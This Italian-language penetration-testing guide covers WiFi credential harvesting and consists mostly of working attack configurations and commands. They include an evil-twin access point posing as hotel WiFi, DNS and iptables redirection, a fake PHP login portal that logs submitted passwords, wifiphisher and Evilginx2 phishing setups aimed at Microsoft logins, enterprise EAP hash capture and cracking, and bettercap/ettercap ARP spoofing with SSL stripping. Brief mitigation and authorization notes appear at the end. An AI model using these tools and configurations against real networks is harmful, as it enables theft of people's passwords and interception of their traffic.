# Credentials Harvesting (WiFi)

## Scopo

Questa guida copre tecniche di raccolta credenziali in ambienti wireless, utilizzate durante penetration test per valutare la sicurezza delle reti e la consapevolezza degli utenti.

## Prerequisiti

- Scheda WiFi dual-band con AP mode
- Kali Linux
- hostapd, dnsmasq, Apache/Nginx
- Conoscenza Evil Twin attacks
- **Autorizzazione esplicita per testing**

## Installazione

```bash
sudo apt-get update
sudo apt-get install hostapd dnsmasq apache2 php
sudo apt-get install wifiphisher
```

---

## Vettori di Attacco

```
1. Captive Portal (WiFi password)
2. Fake Login Page (social media, email)
3. SSL Strip (downgrade HTTPS)
4. Credential Sniffing (traffic analysis)
5. EAP Downgrade (enterprise)
```

---

## Captive Portal Attack

### Setup AP

```bash
# /etc/hostapd/hostapd.conf
interface=wlan1
driver=nl80211
ssid=Hotel_WiFi_Free
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
```

### DHCP

```bash
# /etc/dnsmasq.conf
interface=wlan1
dhcp-range=192.168.1.50,192.168.1.150,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
```

### Redirect Rules

```bash
# iptables
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
sudo iptables -t nat -A PREROUTING -i wlan1 -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1:80
sudo iptables -A FORWARD -i wlan1 -j ACCEPT
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
```

### Portal Page (PHP)

```php
<!-- /var/www/html/index.php -->
<!DOCTYPE html>
<html>
<head><title>WiFi Login</title></head>
<body>
<h2>Hotel WiFi - Please Login</h2>
<form method="POST" action="login.php">
    Username: <input name="user"><br>
    Password: <input type="password" name="pass"><br>
    <input type="submit" value="Connect">
</form>
</body>
</html>
```

```php
<!-- /var/www/html/login.php -->
<?php
$file = fopen("/var/log/creds.log", "a");
$user = $_POST['user'];
$pass = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("Y-m-d H:i:s");
fwrite($file, "[$time] $ip - User: $user - Pass: $pass\n");
fclose($file);
header("Location: http://google.com");
?>
```

---

## Wifiphisher

### Phishing Automatico

```bash
# Basic - WiFi password phishing
sudo wifiphisher -aI wlan1 -eI wlan2 -p wifi_connect

# OAuth phishing
sudo wifiphisher -aI wlan1 -p oauth-login

# Firmware update (social engineering)
sudo wifiphisher -aI wlan1 -p firmware-upgrade
```

### Custom Template

```bash
# Crea template
mkdir /root/custom_phishing
# index.html, login.php, style.css

# Usa template
sudo wifiphisher -aI wlan1 -pK /root/custom_phishing
```

---

## Evilginx2

### Phishing Avanzato

```bash
# Installazione
git clone https://github.com/kgretzky/evilginx2.git
cd evilginx2
make

# Avvio
sudo ./bin/evilginx -p ./phishlets
```

### Configurazione

```
: config domain evil.example.com
: config ip 192.168.1.1

: phishlets hostname microsoft evil.example.com
: phishlets enable microsoft

: lures create microsoft
: lures get-url 0
```

---

## EAP Credential Harvesting

### hostapd-mana (Enterprise)

```bash
# Cattura hash EAP
interface=wlan1
driver=nl80211
ssid=Corporate_WiFi
hw_mode=g
channel=6
wpa=2
wpa_key_mgmt=WPA-EAP
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-mana/hostapd.eap_user
mana_eapsuccess=1
mana_wpe=1
```

### EAP User File

```
# /etc/hostapd-mana/hostapd.eap_user
*   PEAP,TTLS,MD5,GTC
"t" TTLS-MSCHAPV2,MSCHAPV2,MD5 "t" [2]
```

### Crack EAP Hash

```bash
# Hash log
cat /tmp/hostapd-mana.eap

# Asleap (LEAP)
asleap -C challenge -R response -W wordlist.txt

# Hashcat (PEAP/MSCHAP)
hashcat -m 5500 hash.txt wordlist.txt
```

---

## Traffic Sniffing

### Bettercap

```bash
sudo bettercap -iface wlan1
> net.sniff on
> set net.sniff.regexp '(?i)(pass|pwd|login|user)'
> set http.proxy.sslstrip true
> http.proxy on
```

### Ettercap

```bash
sudo ettercap -Tqi wlan1 -M arp:remote /GATEWAY// /VICTIM//
```

---

## Credential Storage

### Logging Centralizzato

```bash
# rsyslog
# /var/log/captured_creds.log

# o database SQLite
sqlite3 creds.db "CREATE TABLE creds(timestamp TEXT, ip TEXT, user TEXT, pass TEXT);"
```

### Report Format

```markdown
# Credential Harvesting Report

## Test Parameters
- Date: XXXX
- Scope: Building A
- Duration: 2 hours

## Captured Credentials
| Time | Target | Username | Type |
|------|--------|----------|------|
| 10:30 | Captive | user@corp | WiFi |
| 11:45 | OAuth | admin | Web |

## Statistics
- Total attempts: X
- Successful captures: Y
- Unique users: Z
```

---

## Mitigazioni

### Lato Utente

```
- Verifica certificati
- Non connettersi a reti sconosciute
- Usa VPN
- Verifica HTTPS (no downgrade)
- Training awareness
```

### Lato Enterprise

```
- WPA3-Enterprise
- EAP-TLS con certificati client
- WIDS/WIPS
- Certificate pinning
- Network segmentation
- Monitoring anomalie
```

---

## Best Practices

- **Autorizzazione**: Sempre scritta e specifica
- **Scope limitato**: Solo target autorizzati
- **Ethical handling**: Non usare credenziali raccolte
- **Secure storage**: Cripta log credenziali
- **Report**: Documenta per training awareness
- **Cleanup**: Rimuovi tutti i dati post-test

## Riferimenti

- [Wifiphisher](https://wifiphisher.org/)
- [Evilginx2](https://github.com/kgretzky/evilginx2)
- [hostapd-mana](https://github.com/sensepost/hostapd-mana)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
